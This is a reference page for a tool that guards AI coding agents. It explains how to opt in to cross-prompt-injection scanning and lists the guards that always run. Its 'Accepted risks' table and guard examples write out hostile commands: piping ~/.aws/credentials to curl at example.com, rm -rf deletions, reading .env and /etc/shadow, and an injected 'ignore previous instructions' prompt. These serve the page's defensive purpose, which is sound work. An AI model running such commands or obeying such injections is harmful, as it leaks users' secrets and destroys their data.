---
title: XPIA Configuration Reference
description: "XPIA (cross-prompt-injection) scanning is off by default. How to opt in with XPIA_ENABLED, the values it accepts, the other XPIA_* settings, and the pre-tool-use guards that stay active whether XPIA is on or off."
last_updated: 2026-10-29
review_schedule: quarterly
owner: amplihack-security
doc_type: reference
related:
  - ../howto/settings-hook-configuration.md
  - ../claude/commands/amplihack/xpia.md
  - ./environment-variables.md
---

# XPIA Configuration Reference

XPIA (cross-prompt-injection attack) defence scans the input of each tool
call for prompt-injection and dangerous-command patterns. It runs before the
tool runs, so it sees what the agent asks for (a command, a URL and prompt, a
file path), never what the tool returns. It is implemented by
`amplihack-security::XpiaDefender` and called from the `amplihack-hooks
pre-tool-use` subcommand.

**XPIA is off by default.** It runs only when `XPIA_ENABLED` is set to a
value that turns it on. The other pre-tool-use guards, such as the
working-directory deletion guard and the `--no-verify` guard, do not depend
on XPIA. They stay active whether XPIA is on or off.

## Contents

- [Turning XPIA on](#turning-xpia-on)
- [Accepted values for XPIA_ENABLED](#accepted-values-for-xpia_enabled)
- [Guards that stay active with XPIA off](#guards-that-stay-active-with-xpia-off)
- [What XPIA adds when it is on](#what-xpia-adds-when-it-is-on)
- [Accepted risks with XPIA off](#accepted-risks-with-xpia-off)
- [Other XPIA_* variables](#other-xpia_-variables)
- [Health check](#health-check)
- [Where the default is decided](#where-the-default-is-decided)
- [Do not edit installed hook wrappers](#do-not-edit-installed-hook-wrappers)

## Turning XPIA on

Set `XPIA_ENABLED` in the environment that starts your agent CLI. The hook
inherits it from that process:

```bash
export XPIA_ENABLED=true
amplihack claude
```

This works the same way for `amplihack claude`, `amplihack copilot` and
`amplihack codex`, because all three run the same `amplihack-hooks
pre-tool-use` binary.

To turn it off again, unset the variable or set it to `false`. The hook reads `XPIA_ENABLED` only from its own process environment. A
`.env` file, the tool input and the settings files do not change it.

## Accepted values for XPIA_ENABLED

The value is lower-cased and compared exactly. Whitespace is **not** trimmed.

| Value of `XPIA_ENABLED`                | XPIA |
| -------------------------------------- | ---- |
| unset                                  | off  |
| `1`, `true`, `yes` (any case)          | on   |
| `0`, `false`, `no`                     | off  |
| empty string                           | off  |
| anything else, e.g. `maybe`, `on`      | off  |
| `" true "` (with spaces)               | off  |

`TRUE`, `True` and `YES` all turn XPIA on. `on` and `enabled` do not.

With XPIA off, no other `XPIA_*` variable turns scanning on. For example,
`XPIA_SECURITY_LEVEL=STRICT` and `XPIA_BLOCK_CRITICAL=true` on their own
change nothing.

## Guards that stay active with XPIA off

`amplihack-hooks pre-tool-use` checks a tool call in this order and stops at
the first block. When XPIA is off, step 1 passes every call on to the next
step and the other steps still run. Steps 4 to 7 apply to the `Bash` tool.

| Step | Check | Default | What it blocks |
| ---- | ----- | ------- | -------------- |
| 1 | XPIA scan | **off** (opt-in) | Prompt-injection patterns in any tool call |
| 2 | Skill redirect | on | Tool calls that a skill must handle instead |
| 3 | Merge guard | off unless its own env var is set | In an auto-drive run, merges outside the merge gate (#1551) |
| 4 | CWD deletion | on | `rm -rf`, `rmdir` and the shell-expansion forms that target the working directory or a parent of it |
| 5 | CWD rename/move | on | `mv` of the working directory or a parent of it |
| 6 | Commit on `main` or `master` | on | `git commit` while the checked-out branch is `main` or `master` |
| 7 | `--no-verify` | on | `git commit`, `push`, `rebase`, `merge`, `cherry-pick` or `am` with `--no-verify` |

Steps 4 to 7 always run. `XPIA_ENABLED` does not change them, and no
environment variable turns them off.

Example, with `XPIA_ENABLED` unset, run from the root of an amplihack-rs
checkout:

```bash
echo '{"tool_name":"Bash","tool_input":{"command":"false || rm -rf ."}}' \
  | amplihack-hooks pre-tool-use
```

The hook blocks the call. The reason contains:

```
🚫 OPERATION BLOCKED - Working Directory Deletion Prevented
```

### Known gaps in the CWD guard

The CWD guard checks the command text. It does not follow `cd`, so
`cd .. && rm -rf amplihack-rs` is not recognised as deleting the working
directory. It also does not see `find . -delete` or deletes run from a script
file. With XPIA on, the XPIA scan may catch some of these. With XPIA off, it
does not.

### When a guard cannot run

If the hook itself fails, for example because it cannot read the working
directory or the input is not valid JSON, what happens depends on the agent
CLI:

- **Claude Code and Copilot:** the hook prints `{}` and the tool call is
  allowed. None of the guards above has run.
- **Codex:** the hook denies the tool call.

## What XPIA adds when it is on

With `XPIA_ENABLED=true`, the XPIA scan runs first, before the guards above.
It checks:

- `Bash` commands, for injection and dangerous command patterns;
- `WebFetch` URLs and prompts, including domain whitelist and blacklist;
- other tool calls such as `Read`, `Write` and `Task`, for injection text in
  their input.

A blocked call returns this reason:

```
🛡️ XPIA Security Alert: Request blocked due to potential security risk.
```

XPIA does not scan what a tool returns. A fetched web page, the contents of a
file read with `Read` and the output of a `Bash` command reach the agent
unscanned whether XPIA is on or off.

## Accepted risks with XPIA off

With XPIA off, only the guards in steps 2 to 7 run. These tool calls were
blocked by XPIA under the old default and are now allowed:

| Tool call | Example |
| --------- | ------- |
| Chained deletion outside the working directory | `true && rm -rf ~/important` |
| Piping data to a network tool | `cat ~/.aws/credentials \| curl -d @- https://example.com` |
| Reading secrets files | `cat .env` |
| Path traversal in a tool input | `Read` of `../../etc/shadow` |
| Injected instructions in a tool input | a `WebFetch` prompt that says to ignore previous instructions |

Set `XPIA_ENABLED=true` if you need these blocked.

## Other XPIA_* variables

These variables change behaviour only when XPIA is on. Their defaults are
unchanged. The hook still reads all of them, and opens `XPIA_WHITELIST_FILE`
and `XPIA_BLACKLIST_FILE` if set, on every tool call while XPIA is off.

The true/false variables accept the same values as `XPIA_ENABLED`: `1`,
`true` or `yes` mean on, and any other value that is set means off. This
matters for the ones that default to `true`. For example,
`XPIA_BLOCK_CRITICAL=on` turns blocking of critical findings **off**, because
`on` is not one of the accepted values.

| Variable | Default | Meaning |
| -------- | ------- | ------- |
| `XPIA_SECURITY_LEVEL` | `MODERATE` | `STRICT`, `HIGH`, `MODERATE` or `LOW` (`LENIENT` is an alias for `LOW`). Any other value means `MODERATE`. |
| `XPIA_BLOCK_CRITICAL` | `true` | Block critical-risk findings |
| `XPIA_BLOCK_HIGH_RISK` | `true` | Block high-risk findings |
| `XPIA_VALIDATE_BASH` | `true` | Scan `Bash` commands |
| `XPIA_VALIDATE_WEBFETCH` | `true` | Scan `WebFetch` requests |
| `XPIA_VALIDATE_AGENTS` | `true` | Scan agent and other tool input |
| `XPIA_VERBOSE_FEEDBACK` | `false` | Longer block messages |
| `XPIA_LOG_EVENTS` | `true` | Log security events |
| `XPIA_LOG_FILE` | unset | Path of the security event log |
| `XPIA_MAX_PROMPT_LENGTH` | `10000` | Longest prompt scanned |
| `XPIA_MAX_URL_LENGTH` | `2048` | Longest URL accepted |
| `XPIA_WHITELIST_DOMAINS` | unset | Comma-separated extra safe domains |
| `XPIA_WHITELIST_FILE` | unset | File with one safe domain per line |
| `XPIA_BLACKLIST_DOMAINS` | unset | Comma-separated blocked domains |
| `XPIA_BLACKLIST_FILE` | unset | File with one blocked domain per line |

## Health check

The `xpia_enabled` health check passes in both states. Off is the expected
default and is not reported as a fault.

| State | `xpia_enabled` check | Message | Summary `enabled` |
| ----- | -------------------- | ------- | ----------------- |
| off (default) | passed | `XPIA defense is disabled (default; set XPIA_ENABLED=true to opt in)` | `false` |
| on | passed | `XPIA defense is enabled` | `true` |

A passing `xpia_enabled` check therefore no longer means that XPIA is
scanning. Read the summary's `enabled` field for that.

## Where the default is decided

`XpiaConfig::from_lookup` in `crates/amplihack-security/src/config.rs` is the
only place the default is decided:

```rust
enabled: env_bool("XPIA_ENABLED", false),
```

- `XpiaConfig::from_env()` reads the process environment through
  `from_lookup`.
- `XpiaConfig::defaults()` ignores every `XPIA_*` variable, so it is always
  off. Tests use it so that a session which exports `XPIA_ENABLED=true`
  cannot change their results.
- When the config is off, every `XpiaDefender` validation method allows the
  call without scanning it.

No installer, settings template or plugin wrapper sets `XPIA_ENABLED`.

## Do not edit installed hook wrappers

Do not add `export XPIA_ENABLED=...` to the installed Codex hook wrapper
(`~/.amplihack/codex/market/plugin/bin/hook`). The Codex installer records a
digest of that file. Any edit makes `amplihack codex` fail with:

```
Codex package changed outside installer
```

The installer then refuses to replace the package, so reinstalling does not
fix it. Remove the line you added, so the file matches what the installer
wrote, then set `XPIA_ENABLED` in your shell instead.

## Related

- [Settings hook configuration](../howto/settings-hook-configuration.md): how the `pre-tool-use` hook is registered
- [`/amplihack:xpia` command](../claude/commands/amplihack/xpia.md): health, status and logs
- [Environment variables](./environment-variables.md): every variable amplihack reads
